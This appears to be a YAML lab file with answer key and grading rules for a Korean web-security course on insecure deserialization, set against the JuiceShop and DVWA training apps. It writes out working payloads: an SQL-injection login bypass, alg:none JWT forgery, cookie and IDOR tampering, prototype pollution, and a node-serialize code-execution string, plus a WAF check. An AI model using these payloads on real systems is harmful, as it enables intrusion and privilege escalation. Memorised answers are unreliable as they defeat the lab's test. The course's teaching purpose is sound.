lab_id: web-vuln-nonai-week09
title: Insecure Deserialization 실습
version: non-ai
course: web-vuln-nonai
week: 9
description: 안전하지 않은 역직렬화 취약점을 통한 JWT 변조, Prototype Pollution, 쿠키 객체 조작을 JuiceShop과
  DVWA에서 실습합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 직렬화/역직렬화의 원리와 보안 위험을 이해한다
- JWT 토큰 조작과 알고리즘 변조를 실습한다
- Prototype Pollution과 쿠키 기반 객체 조작을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하고 JWT 토큰을 획득하시오.
  hint: POST /rest/user/login 에 email 필드에 ' or 1=1-- 을 넣고 password는 아무 값을 넣으세요.
  category: recon
  points: 8
  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
    \ -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type:\
    \ application/json' \\\n     -d '{\"email\":\"' or 1=1--\",\"password\":\"anything\"\
    }'"
  answer_detail: JuiceShop의 로그인 API는 SQLite를 사용하며, SQL Injection으로 인증을 우회할 수 있습니다.
    성공하면 JWT 토큰(authentication.token)이 반환되며, 이 토큰의 직렬화된 페이로드를 역직렬화 공격에 활용합니다.
  verify:
    type: output_contains
    expect: token
    field: stdout
    semantic:
      intent: JuiceShop SQLi 인증 — POST /rest/user/login + email=' or 1=1-- + password:anything.
        JWT 토큰 획득 → 후속 역직렬화 공격 준비. OWASP A03 + A08.
      success_criteria:
      - SQLi 로그인 페이로드
      - token 키워드
      - authentication JWT 반환
      acceptable_methods:
      - curl POST SQLi
      - Burp Repeater
      - sqlmap --auth-type
      negative_signs:
      - SQLi 없음
      - 토큰 미획득
      - 단순 로그인
  target_vm: attacker
- order: 2
  instruction: 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를
    확인하라.
  hint: JWT는 header.payload.signature 형태입니다. echo 'JWT_PART' | base64 -d 로 각 부분을 디코딩하세요.
  category: recon
  points: 10
  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
    | cut -d''"'' -f4) && echo ''=== JWT Header ==='' && echo $TOKEN | cut -d. -f1
    | base64 -d 2>/dev/null && echo '''' && echo ''=== JWT Payload ==='' && echo $TOKEN
    | cut -d. -f2 | base64 -d 2>/dev/null'
  answer_detail: JWT 페이로드에는 사용자 ID, 이메일, 역할(role) 등의 정보가 JSON 형태로 직렬화되어 있습니다. Header의
    alg 필드가 HS256이면 HMAC 서명, RS256이면 RSA 서명입니다. 서명 알고리즘이 none이거나 약한 키를 사용하면 페이로드를
    변조할 수 있습니다.
  verify:
    type: output_contains
    expect: JWT Header
    field: stdout
    semantic:
      intent: 'JWT 구조 분석 — cut -d. -f1/2 + base64 -d. Header(alg: HS256/RS256) + Payload(id/email/role).
        alg=none 또는 약한 키 = 변조 가능. RFC 7519.'
      success_criteria:
      - JWT Header 키워드
      - Header + Payload 분리 디코딩
      - base64 -d
      acceptable_methods:
      - cut + base64
      - jwt_tool
      - jwt.io decoder
      negative_signs:
      - 디코딩 없음
      - Header만
      - Payload 분석 없음
  target_vm: attacker
- order: 3
  instruction: JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도하시오. 페이로드의 id를 다른 사용자로 변경한 위조
    토큰을 생성하라.
  hint: 헤더를 {"alg":"none","typ":"JWT"}로 변경하고, 페이로드에서 id를 2로 수정 후 Base64URL 인코딩하세요.
    서명 부분은 비워둡니다(header.payload. 형태).
  category: exploit
  points: 12
  answer: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr ''+/''
    ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"status":"success","data":{"id":2,"email":"user@juice-sh.op","role":"customer"}}''
    | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="${HEADER}.${PAYLOAD}."
    && echo "Forged JWT: ${FORGED:0:60}..." && curl -s http://10.20.30.80:3000/rest/basket/2
    -H "Authorization: Bearer $FORGED" -w ''\nHTTP:%{http_code}'''
  answer_detail: 'Algorithm None 공격은 JWT의 alg 필드를 none으로 설정하여 서명 검증을 건너뛰게 합니다. 서버가
    alg 값을 신뢰하면 서명 없이도 변조된 토큰을 수용합니다. 방어: 서버에서 알고리즘을 고정하고 none을 명시적으로 거부해야 합니다.'
  verify:
    type: output_contains
    expect:
    - Forged JWT
    - none
    field: stdout
    semantic:
      intent: JWT alg:none 위조 — Header {alg:none,typ:JWT} + Payload id=2 role=customer
        변조 + 서명 제거 (header.payload. 형태). base64url 인코딩. CVE-2015-9235 + CWE-287.
      success_criteria:
      - Forged JWT 키워드
      - alg:none + 페이로드 변조
      - base64url (tr '+/' '-_')
      acceptable_methods:
      - 수동 위조
      - jwt_tool -X
      - PyJWT decode/encode
      negative_signs:
      - 위조 없음
      - 원본 JWT
      - 서명 포함
  target_vm: attacker
- order: 4
  instruction: DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security 쿠키를
    확인하라.
  hint: curl -v -d 'username=admin&password=password&Login=Login' http://{{WEB_IP}}:8080/login.php
    로 응답 헤더의 Set-Cookie를 확인하세요.
  category: recon
  points: 8
  answer: "curl -s -c /tmp/dvwa_deser.txt \\\n  -d 'username=admin&password=password&Login=Login'\
    \ http://10.20.30.80:8080/login.php -L -D - \\\n | grep -i 'set-cookie' && echo\
    \ '=== Cookie File ===' && cat /tmp/dvwa_deser.txt"
  answer_detail: PHP의 세션은 서버 측에 저장되지만, security 쿠키는 클라이언트에 평문으로 저장됩니다. 클라이언트에서 쿠키
    값을 변조하면 서버가 검증 없이 사용하여 보안 레벨이 변경됩니다. 이것이 신뢰할 수 없는 데이터의 역직렬화 문제입니다.
  verify:
    type: output_contains
    expect: Set-Cookie
    field: stdout
    semantic:
      intent: DVWA 쿠키 구조 — curl -c cookies + POST /login.php + Set-Cookie 분석. PHPSESSID
        서버측 + security 클라이언트 평문. 신뢰 불가 데이터. CWE-502.
      success_criteria:
      - Set-Cookie 키워드
      - PHPSESSID + security 쿠키
      - 쿠키 파일 저장
      acceptable_methods:
      - curl -c/-b 쿠키
      - Burp Proxy 쿠키 보기
      - browser DevTools
      negative_signs:
      - 로그인 없음
      - 쿠키 미분석
      - 평문 의미 맥락 없음
  target_vm: attacker
- order: 5
  instruction: 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로 변경하여
    SQL Injection이 가능한 상태로 만들어라.
  hint: curl -b 'PHPSESSID=세션값;security=low' 형태로 쿠키를 직접 지정하세요.
  category: exploit
  points: 10
  answer: SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk '{print $NF}') && echo
    '=== impossible 레벨 ===' && curl -s -b "PHPSESSID=$SESSID;security=impossible"
    'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' -o /dev/null
    -w 'HTTP:%{http_code}' && echo '' && echo '=== low 레벨 (변조) ===' && curl -s -b
    "PHPSESSID=$SESSID;security=low" "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
    | grep -o 'First name:[^<]*' | head -3
  answer_detail: DVWA는 보안 레벨을 클라이언트 쿠키로 관리합니다. 클라이언트 측에서 쿠키 값을 변조하면 서버의 보안 설정을 우회할
    수 있습니다. 이는 신뢰할 수 없는 데이터(쿠키)를 검증 없이 사용하는 대표적인 역직렬화 취약 패턴입니다.
  verify:
    type: output_contains
    expect:
    - First name
    - low
    field: stdout
    semantic:
      intent: DVWA 쿠키 변조 — curl -b PHPSESSID=x;security=low + SQLi 페이로드 '+OR+'1'='1.
        클라이언트 쿠키 변조로 보안 레벨 우회. 역직렬화 취약 패턴 (신뢰 불가 쿠키 검증 X). CWE-502 + CWE-565.
      success_criteria:
      - First name 키워드
      - 쿠키 변조 (security=low)
      - SQLi 결합
      acceptable_methods:
      - curl -b + 수동 쿠키
      - Burp Proxy 쿠키 변조
      - EditThisCookie 확장
      negative_signs:
      - 쿠키 미변조
      - 단순 SQLi
      - 역직렬화 맥락 없음
  target_vm: attacker
- order: 6
  instruction: JuiceShop의 장바구니 API에서 BOLA/IDOR을 이용한 객체 참조 변조를 수행하시오. 다른 사용자의 장바구니(basket/1,
    basket/2)에 접근하라.
  hint: 인증 토큰과 함께 /rest/basket/1, /rest/basket/2에 순차적으로 접근하여 다른 사용자 데이터를 조회하세요.
  category: exploit
  points: 12
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
    ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}''
    | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== Basket 1 ===''
    && curl -s http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN"
    | head -c 300 && echo '''' && echo ''=== Basket 2 ==='' && curl -s http://10.20.30.80:3000/rest/basket/2
    -H "Authorization: Bearer $TOKEN" | head -c 300'
  answer_detail: 직렬화된 객체의 ID 값을 변경하면 서버가 권한 확인 없이 요청된 리소스를 반환합니다. basket/1에서 basket/2로
    변경하는 것은 직렬화된 참조를 조작하는 것과 같습니다. 서버는 반드시 요청자가 해당 객체에 접근할 권한이 있는지 검증해야 합니다.
  verify:
    type: output_contains
    expect: Basket
    field: stdout
    semantic:
      intent: IDOR/BOLA — /rest/basket/1 + /rest/basket/2 순차 접근. 권한 확인 없이 직렬화 ID 값
        변경. 다른 사용자 데이터. OWASP A01 Broken Access Control + OWASP API1 BOLA.
      success_criteria:
      - Basket 키워드
      - basket/1 + basket/2 순차
      - Authorization Bearer
      acceptable_methods:
      - 수동 ID 변경
      - Burp Intruder 숫자 증가
      - ffuf -w number list
      negative_signs:
      - 단일 ID
      - 권한 확인 맥락 없음
      - IDOR 개념 누락
  target_vm: attacker
- order: 7
  instruction: Prototype Pollution 공격을 시도하시오. JuiceShop API에 __proto__ 속성을 포함한 JSON을
    전송하여 서버 객체를 오염시켜라.
  hint: POST /api/Users/ 에 {"email":"proto@test.com","password":"test1234","__proto__":{"role":"admin","isAdmin":true}}
    형태로 전송하세요.
  category: exploit
  points: 12
  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
    \ -s \\\n     -X POST http://10.20.30.80:3000/api/Users/ \\\n     -H 'Content-Type:\
    \ application/json' \\\n     -d '{\"email\":\"proto_test@test.com\",\"password\"\
    :\"test1234\",\"passwordRepeat\":\"test1234\",\"__proto__\":{\"role\":\"admin\"\
    ,\"isAdmin\":true}}' -w '\\nHTTP:%{http_code}'"
  answer_detail: 'Prototype Pollution은 JavaScript 객체의 __proto__ 속성을 조작하여 Object.prototype을
    오염시킵니다. JSON.parse()나 Object.assign()으로 사용자 입력을 처리할 때 __proto__ 키가 포함되면 모든 객체에서
    오염된 속성(isAdmin: true)이 상속되어 권한 상승이 발생합니다.'
  verify:
    type: output_contains
    expect: email
    field: stdout
    semantic:
      intent: Prototype Pollution — POST /api/Users/ + __proto__:{role:admin,isAdmin:true}.
        Object.prototype 오염 → 모든 객체 상속. JSON.parse/Object.assign 취약. CVE-2019-10744
        (lodash). CWE-1321.
      success_criteria:
      - __proto__ 속성 포함
      - email 키워드 또는 응답
      - Prototype Pollution 페이로드
      acceptable_methods:
      - __proto__ JSON 삽입
      - ppfuzz 자동
      - Snyk Prototype Pollution 검증
      negative_signs:
      - __proto__ 없음
      - 단순 JSON
      - prototype 맥락 없음
  target_vm: attacker
- order: 8
  instruction: Node.js의 node-serialize 모듈 취약점 페이로드를 작성하시오. IIFE(즉시 실행 함수) 패턴이 포함된
    직렬화 문자열을 구성하고 /tmp/node_deser.json에 저장하라.
  hint: node-serialize는 _$$ND_FUNC$$_ 마커로 함수를 직렬화합니다. {"rce":"_$$ND_FUNC$$_function(){return
    require('child_process').execSync('id').toString()}()"} 형태입니다.
  category: exploit
  points: 10
  answer: "cat > /tmp/node_deser.json << 'JSONEOF'\n{\n  \"username\": \"attacker\"\
    ,\n  \"rce\": \"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"\
    \n}\nJSONEOF\necho '=== Node.js Deserialization Payload ===' && cat /tmp/node_deser.json\
    \ && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type:\
    \ application/json' -d @/tmp/node_deser.json -w '\\nHTTP:%{http_code}'"
  answer_detail: node-serialize 모듈은 직렬화된 문자열에 _$$ND_FUNC$$_ 마커가 있으면 JavaScript 함수로
    복원합니다. IIFE 패턴(함수 끝에 ())을 추가하면 역직렬화 시 자동 실행됩니다. require('child_process').execSync()로
    시스템 명령을 실행할 수 있습니다.
  verify:
    type: output_contains
    expect:
    - Node.js Deserialization Payload
    - payload
    field: stdout
    semantic:
      intent: 'node-serialize RCE — {rce: _$$ND_FUNC$$_function(){require(''child_process'').execSync(''id'')}()}.
        IIFE () 자동 실행. 역직렬화 시 RCE. CVE-2017-5941 node-serialize. CWE-502.'
      success_criteria:
      - Node.js Deserialization Payload 키워드
      - _$$ND_FUNC$$_ + IIFE
      - child_process.execSync
      acceptable_methods:
      - 수동 페이로드
      - ysoserial (Java 변형)
      - pickle payload (Python)
      negative_signs:
      - IIFE 없음
      - _$$ND_FUNC$$_ 누락
      - RCE 실행 맥락 없음
  target_vm: attacker
- order: 9
  instruction: 역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_ 패턴을
    차단하는지 확인하고, 직접 접근(포트 3000)과 비교하라.
  hint: 같은 Prototype Pollution 페이로드를 포트 80과 포트 3000에 각각 전송하여 응답 코드를 비교하세요.
  category: defense
  points: 10
  answer: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
    -X POST http://10.20.30.80:80/api/Users/ -H ''Content-Type: application/json''
    -d ''{"email":"waf@t.com","password":"t","__proto__":{"role":"admin"}}'' && echo
    '''' && echo ''=== Direct (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
    -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json''
    -d ''{"email":"nowaf@t.com","password":"t","__proto__":{"role":"admin"}}'''
  answer_detail: 역직렬화 방어의 핵심은 신뢰할 수 없는 데이터를 역직렬화하지 않는 것입니다. WAF에서 __proto__, constructor,
    _$$ND_FUNC$$_ 패턴을 차단하고, 서버 코드에서는 JSON Schema 검증, allowlist 기반 필드 필터링을 적용해야 합니다.
  verify:
    type: output_contains
    expect: ===
    field: stdout
    semantic:
      intent: 역직렬화 방어 검증 — WAF 포트 80 vs JuiceShop 포트 3000. __proto__/_$$ND_FUNC$$_/constructor
        패턴 차단. WAF + 서버 JSON Schema + allowlist 필드. OWASP Deserialization Cheatsheet.
      success_criteria:
      - === 키워드 (포트 비교)
      - ModSecurity vs Direct 비교
      - HTTP 응답 차이
      acceptable_methods:
      - 두 포트 curl 비교
      - Burp 두 엔드포인트
      - WAF 룰 분석
      negative_signs:
      - 비교 없음
      - 단일 포트
      - WAF 효과 맥락 없음
  target_vm: attacker
- order: 99
  instruction: |
    [복합 시나리오] "권한 상승 chain — IDOR 수평 + Prototype Pollution 수직"

    ## 상황 (w08 → w09 시나리오 연속)

    > 선배: "권한 상승은 두 종류 — *수평* (다른 사용자) 과 *수직* (관리자).
    > 수평은 IDOR 로 객체 ID 변조. 수직은 JWT id 변조 또는 prototype pollution 으로 role=admin 주입.
    > 두 케이스 다 시연 + 권한 상승 매트릭스 정리."

    학습 목표 (lecture #1·#2 수평·수직 + #3 IDOR + #4 API 접근제어) + (lab #6 IDOR + #7 Prototype) 통합.

    ## 임무 (3 단계, 약 35분)

    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.

    ### Phase A — IDOR 수평
    1) admin 로그인:
       `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
        http://10.20.30.80/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")`
    2) basket 1~4 비교:
       `for i in 1 2 3 4; do
         curl -s -o /dev/null -w "basket/$i: %{http_code}\n" -H "Authorization: Bearer $JWT"
         http://10.20.30.80/api/Baskets/$i; done`

    ### Phase B — Prototype Pollution 수직
    `curl -s -i -X POST -H "Content-Type: application/json"
     -d '{"email":"test'$(date +%s)'@x.com","password":"Test1234!","__proto__":{"role":"admin"}}'
     http://10.20.30.80/api/Users/` 응답 status + role 필드 캡처.

    ### Phase C — 권한 상승 매트릭스
    | 방향 | 공격 기법 | 입력 위치 | 핵심 방어 | 잔존 위험 |
    | 수평 (IDOR) | object ID 변조 | URL 경로/쿼리 | 객체 owner 검증 | 검증 누락 endpoint |
    | 수직 (JWT id) | id payload 변조 | JWT payload | 서명 검증 + role check | key leak |
    | 수직 (Prototype) | __proto__ 주입 | JSON body | Object.freeze + parse 검사 | 라이브러리 취약 |
    | chain | IDOR → token 탈취 | 다단계 | 다층 인증 + audit log | 종합 모니터링 |
    표 끝 "JuiceShop 권고: API endpoint owner check + __proto__ 거부 + audit log" 한 줄.

    종료: echo "=== Phase A IDOR ===" / "=== Phase B Prototype ===" / "=== Phase C 매트릭스 ===".
